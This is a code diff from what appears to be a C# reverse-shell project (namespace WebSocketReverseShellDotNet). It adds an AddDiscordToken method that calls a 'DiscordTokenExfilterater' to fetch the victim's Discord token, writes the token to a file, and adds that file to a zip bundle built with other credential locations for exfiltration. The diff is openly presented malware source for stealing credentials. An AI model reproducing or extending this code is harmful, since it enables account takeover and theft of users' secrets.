@@ -42,10 +42,31 @@ namespace WebSocketReverseShellDotNet.service.commands
             return path;
         }
 
+        private void AddDiscordToken(List<String> listOfFilesToZip, string destDir)
+        {
+            /*
+             add discord token to list of files to zip
+             */
+            String discordToken = DiscordTokenExfilterater.GetDiscordToken();
+            String? discordFile = OSUtil.CreateFileWithContent(destDir, "DiscordToken.txt", discordToken);
+            if (!string.IsNullOrWhiteSpace(discordFile))
+            {
+                sb.AppendLine($"{discordToken}");
+                listOfFilesToZip.Add(discordFile);
+            }
+
+        }
+
         private  FileInfo? createTokenZipFile(String destDir)
         {
+
+
+
+
             List<String> listOfFilesToZip = new List<string>();
-            
+            AddDiscordToken(listOfFilesToZip, destDir);
+
+
 
             for (int i = 0; i < Constants.LIST_OF_CRED_LOCATIONS.Length; i++)
             {
